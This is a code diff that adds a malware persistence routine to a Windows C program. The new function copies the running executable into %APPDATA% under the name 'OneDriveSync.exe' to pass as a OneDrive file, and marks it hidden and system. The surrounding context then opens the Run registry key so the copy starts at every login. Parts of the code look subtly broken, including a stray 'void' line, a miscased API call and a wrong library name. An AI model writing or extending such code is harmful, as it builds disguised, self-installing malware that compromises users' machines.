@@ -1,5 +1,18 @@
 #include <windows.h>
-
+#include <shlobj.h>
+#pragma comment(lib, "shell.lib")
+void move_to_appdate(char *dst){
+    char app[MAX_PATH], self[MAX_PATH]; //'app' holds the destination path. 'self' holds the current
+    SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, app); //finds %APPDATA path
+    lstrcatA(app, "\\Microsoft\\Windows\\OneDriveSync.exe");
+    GetModuleFileNameA(0, self, MAX_PATH);
+    if (lstrcmpiA(app, self) != 0) { // check if its already there 
+        CopyFileA(self, app, FALSE);
+        setFileAttributesA(app, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+    lstrcpyA(dst, app); //copies final path to dst
+}
+void 
 void persist(const char *exePath) {
     HKEY hKey;
     RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
